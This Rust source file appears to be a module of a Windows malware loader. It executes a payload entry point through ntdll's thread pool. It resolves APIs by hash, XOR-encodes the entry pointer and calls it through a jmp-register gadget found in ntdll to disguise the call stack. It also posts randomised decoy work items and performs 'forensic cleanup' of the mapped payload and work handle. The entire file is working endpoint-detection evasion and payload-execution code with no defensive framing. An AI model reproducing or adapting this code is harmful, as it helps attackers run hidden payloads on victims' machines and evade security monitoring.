#![allow(non_snake_case)]

use core::sync::atomic::{AtomicUsize, Ordering};
use winapi::ctypes::c_void;
use winapi::shared::ntdef::NTSTATUS;

use crate::hash::{fnv1a_hash, get_export_by_hash, get_module_by_hash, H_NTDLL};

type TpAllocWorkFn = unsafe extern "system" fn(
    work_return: *mut *mut c_void,
    callback: *mut c_void,
    context: *mut c_void,
    environment: *mut c_void,
) -> NTSTATUS;

type TpPostWorkFn = unsafe extern "system" fn(work: *mut c_void);

type TpReleaseWorkFn = unsafe extern "system" fn(work: *mut c_void);

const H_TP_ALLOC_WORK: u64 = fnv1a_hash(b"TpAllocWork");
const H_TP_POST_WORK: u64 = fnv1a_hash(b"TpPostWork");
const H_TP_RELEASE_WORK: u64 = fnv1a_hash(b"TpReleaseWork");

static WORK_HANDLE: AtomicUsize = AtomicUsize::new(0);

static ENCODED_ENTRY: AtomicUsize = AtomicUsize::new(0);
static ENTRY_XOR_KEY: AtomicUsize = AtomicUsize::new(0);

static TRAMPOLINE_GADGET: AtomicUsize = AtomicUsize::new(0);

unsafe fn find_trampoline_in_ntdll() -> Option<u64> {
    use crate::hash::fnv1a_hash;

    let (text_start, text_end) = crate::pe::get_ntdll_text_bounds()?;

    let mut candidates: [u64; 16] = [0; 16];
    let mut count = 0usize;

    #[inline(always)]
    unsafe fn scan_range_for_jmp_reg(
        start: usize,
        end: usize,
        text_start: usize,
        text_end: usize,
        candidates: &mut [u64; 16],
        count: &mut usize,
    ) {
        if start >= end || *count >= 16 {
            return;
        }
        let len = end - start;
        let bytes = core::slice::from_raw_parts(start as *const u8, len);
        let mut found_in_window = 0u32;

        let mut i = 0usize;
        while i < len.saturating_sub(2) && *count < 16 && found_in_window < 2 {
            let b0 = bytes[i];
            let b1 = bytes[i + 1];

            let gadget_addr;

            if b0 == 0xFF && b1 >= 0xE0 && b1 <= 0xE2 {

                gadget_addr = (start + i) as u64;
            } else if b0 == 0x41 && b1 == 0xFF && i + 2 < len {
                let b2 = bytes[i + 2];
                if b2 == 0xE0 || b2 == 0xE1 {

                    gadget_addr = (start + i) as u64;
                } else {
                    i += 1;
                    continue;
                }
            } else {
                i += 1;
                continue;
            }

            let ga = gadget_addr as usize;
            if ga >= text_start && ga < text_end {
                let dup = candidates[..*count].iter().any(|&c| c == gadget_addr);
                if !dup {
                    candidates[*count] = gadget_addr;
                    *count += 1;
                    found_in_window += 1;
                }
            }

            i += 64;
        }
    }

    const STUB_HASHES: [u64; 6] = [
        fnv1a_hash(b"NtClose"),
        fnv1a_hash(b"NtCreateFile"),
        fnv1a_hash(b"NtQueryVirtualMemory"),
        fnv1a_hash(b"NtOpenProcess"),
        fnv1a_hash(b"NtDuplicateObject"),
        fnv1a_hash(b"NtSetEvent"),
    ];

    for &hash in &STUB_HASHES {
        if count >= 16 {
            break;
        }
        if let Some((_ssn, stub)) = crate::ssn_resolver::resolve_ssn_by_hash(hash) {
            let stub_addr = stub as usize;
            let s = stub_addr.saturating_sub(128).max(text_start);
            let e = (stub_addr + 384).min(text_end);
            scan_range_for_jmp_reg(s, e, text_start, text_end, &mut candidates, &mut count);
        }
    }

    if count > 0 {
        let idx = crate::stack_spoof::random_index(count);
        crate::debug_log!(
            "[TP] Trampoline (layer 1 stub proximity): {} candidates",
            count
        );
        return Some(candidates[idx]);
    }

    const FUNC_HASHES: [u64; 8] = [
        fnv1a_hash(b"RtlAddVectoredExceptionHandler"),
        fnv1a_hash(b"RtlDispatchException"),
        fnv1a_hash(b"LdrLoadDll"),
        fnv1a_hash(b"RtlCaptureContext"),
        fnv1a_hash(b"RtlRaiseException"),
        fnv1a_hash(b"KiUserCallbackDispatcher"),
        fnv1a_hash(b"LdrGetProcedureAddress"),
        fnv1a_hash(b"RtlLookupFunctionEntry"),
    ];

    let ntdll = crate::hash::get_module_by_hash(crate::hash::H_NTDLL)?;

    for &hash in &FUNC_HASHES {
        if count >= 16 {
            break;
        }
        if let Some(func) = crate::hash::get_export_by_hash(ntdll, hash) {
            let func_addr = func as usize;
            if func_addr < text_start || func_addr >= text_end {
                continue;
            }

            let s = func_addr.saturating_sub(256).max(text_start);
            let e = (func_addr + 0x800).min(text_end);
            scan_range_for_jmp_reg(s, e, text_start, text_end, &mut candidates, &mut count);
        }
    }

    if count == 0 {
        crate::debug_log!("[TP] Trampoline: no jmp-reg gadget found in ntdll");
        return None;
    }

    let idx = crate::stack_spoof::random_index(count);
    crate::debug_log!(
        "[TP] Trampoline (layer 2 function proximity): {} candidates",
        count
    );
    Some(candidates[idx])
}

unsafe extern "system" fn worker_callback(
    _instance: *mut c_void,
    _context: *mut c_void,
    _work: *mut c_void,
) {

    let key = ENTRY_XOR_KEY.load(Ordering::SeqCst);
    let encoded = ENCODED_ENTRY.load(Ordering::SeqCst);

    if key == 0 || encoded == 0 {
        crate::debug_log!("[TP] Worker callback: no encoded entry available");
        return;
    }

    let entry_addr = encoded ^ key;
    if entry_addr == 0 {
        crate::debug_log!("[TP] Worker callback: decoded null entry");
        return;
    }

    crate::debug_log!("[TP] Worker callback executing");

    let gadget = TRAMPOLINE_GADGET.load(Ordering::SeqCst);

    if gadget == 0 {

        crate::debug_log!("[TP] ABORT: No trampoline gadget  refusing direct call");
        ENCODED_ENTRY.store(0, Ordering::SeqCst);
        ENTRY_XOR_KEY.store(0, Ordering::SeqCst);
        return;
    }

    core::arch::asm!(
        "call {gadget}",
        gadget = in(reg) gadget,
        in("rax") entry_addr,
        in("rcx") entry_addr,
        in("rdx") entry_addr,
        in("r8")  entry_addr,
        clobber_abi("C"),
    );

    crate::debug_log!("[TP] Worker callback returned");

    if crate::config_payload::PAYLOAD_ONESHOT {
        crate::dualview::cleanup_mapped_view();

        crate::timer_sleep::cleanup_timer_resources();
    }

    ENCODED_ENTRY.store(0, Ordering::SeqCst);
    ENTRY_XOR_KEY.store(0, Ordering::SeqCst);

    let work_handle = WORK_HANDLE.swap(0, Ordering::SeqCst);
    if work_handle != 0 {
        let ntdll = crate::hash::get_module_by_hash(crate::hash::H_NTDLL);
        if let Some(ntdll_mod) = ntdll {
            if let Some(f) = crate::hash::get_export_by_hash(ntdll_mod, H_TP_RELEASE_WORK) {
                let tp_release: TpReleaseWorkFn =
                    core::mem::transmute::<winapi::shared::minwindef::FARPROC, TpReleaseWorkFn>(f);
                tp_release(work_handle as *mut c_void);
                crate::debug_log!("[TP] Work item released (forensic cleanup)");
            }
        }
    }}

unsafe extern "system" fn decoy_callback(
    _instance: *mut c_void,
    _context: *mut c_void,
    _work: *mut c_void,
) {

    let tsc: u64;
    core::arch::asm!(
        "rdtsc", "shl rdx, 32", "or rax, rdx",
        out("rax") tsc, out("rdx") _,
        options(nostack, nomem, preserves_flags)
    );

    let mut buf = [0u8; 64];
    let seed_bytes = tsc.to_le_bytes();

    for i in 0..buf.len() {
        core::ptr::write_volatile(
            &mut buf[i],
            seed_bytes[i % 8] ^ (i as u8).wrapping_mul(7).wrapping_add(3),
        );
    }

    let mut acc: u64 = tsc;
    for i in 0..buf.len() {
        acc = acc.wrapping_mul(6364136223846793005).wrapping_add(buf[i] as u64);
        core::ptr::write_volatile(&mut buf[i], (acc >> 32) as u8);
    }

    let mut sink = acc;
    core::ptr::write_volatile(&mut sink, sink.wrapping_mul(7));
}

unsafe fn submit_decoy_work_items(
    tp_alloc: &TpAllocWorkFn,
    tp_post: &TpPostWorkFn,
    tp_release: &TpReleaseWorkFn,
) {

    let tsc: u64;
    core::arch::asm!(
        "rdtsc", "shl rdx, 32", "or rax, rdx",
        out("rax") tsc, out("rdx") _,
        options(nostack, nomem, preserves_flags)
    );
    let decoy_count = 2 + ((tsc as usize) % 3);

    let callback_addr = decoy_callback as *mut c_void;

    for _i in 0..decoy_count {
        let mut decoy_work: *mut c_void = core::ptr::null_mut();
        let status = tp_alloc(
            &mut decoy_work,
            callback_addr,
            core::ptr::null_mut(),
            core::ptr::null_mut(),
        );

        if status >= 0 && !decoy_work.is_null() {
            tp_post(decoy_work);

            crate::timer_sleep::timer_sleep_jitter(1, 3);

            tp_release(decoy_work);
        }
    }

    crate::debug_log!("[TP] {} decoy work items submitted", decoy_count);
}

pub(crate) unsafe fn execute_via_threadpool(entry_point: *mut c_void) -> bool {
    if entry_point.is_null() {
        return false;
    }

    if TRAMPOLINE_GADGET.load(Ordering::SeqCst) == 0 {
        if let Some(gadget) = find_trampoline_in_ntdll() {
            TRAMPOLINE_GADGET.store(gadget as usize, Ordering::SeqCst);
            crate::debug_log!("[TP] Trampoline gadget: 0x{:X}", gadget);
        } else {

            crate::debug_log!("[TP] FATAL: No jmp-reg gadget in ntdll  aborting payload");
            return false;
        }
    }

    let key = core::arch::x86_64::_rdtsc() as usize;

    let key = if key == 0 {
        (core::arch::x86_64::_rdtsc() as usize) | 1
    } else {
        key
    };

    ENTRY_XOR_KEY.store(key, Ordering::SeqCst);
    ENCODED_ENTRY.store(entry_point as usize ^ key, Ordering::SeqCst);

    let ntdll = match get_module_by_hash(H_NTDLL) {
        Some(m) => m,
        None => {
            crate::debug_log!("[TP] ntdll not found");
            return false;
        }
    };

    let tp_alloc: TpAllocWorkFn = match get_export_by_hash(ntdll, H_TP_ALLOC_WORK) {
        Some(f) if !f.is_null() => {
            core::mem::transmute::<winapi::shared::minwindef::FARPROC, TpAllocWorkFn>(f)
        }
        _ => {
            crate::debug_log!("[TP] TpAllocWork not found");
            return false;
        }
    };

    let tp_post: TpPostWorkFn = match get_export_by_hash(ntdll, H_TP_POST_WORK) {
        Some(f) if !f.is_null() => {
            core::mem::transmute::<winapi::shared::minwindef::FARPROC, TpPostWorkFn>(f)
        }
        _ => {
            crate::debug_log!("[TP] TpPostWork not found");
            return false;
        }
    };

    let _tp_release: TpReleaseWorkFn = match get_export_by_hash(ntdll, H_TP_RELEASE_WORK) {
        Some(f) if !f.is_null() => {
            core::mem::transmute::<winapi::shared::minwindef::FARPROC, TpReleaseWorkFn>(f)
        }
        _ => {
            crate::debug_log!("[TP] TpReleaseWork not found");
            return false;
        }
    };

    submit_decoy_work_items(&tp_alloc, &tp_post, &_tp_release);

    let mut work: *mut c_void = core::ptr::null_mut();
    let callback_addr = worker_callback as *mut c_void;

    let status = tp_alloc(
        &mut work,
        callback_addr,
        core::ptr::null_mut(),
        core::ptr::null_mut(),
    );

    if status < 0 || work.is_null() {
        crate::debug_log!("[TP] TpAllocWork failed: 0x{:X}", status);
        return false;
    }

    WORK_HANDLE.store(work as usize, Ordering::SeqCst);

    crate::debug_log!("[TP] Work item allocated, submitting to pool");

    tp_post(work);

    crate::debug_log!("[TP] Payload submitted to thread pool");

    true
}

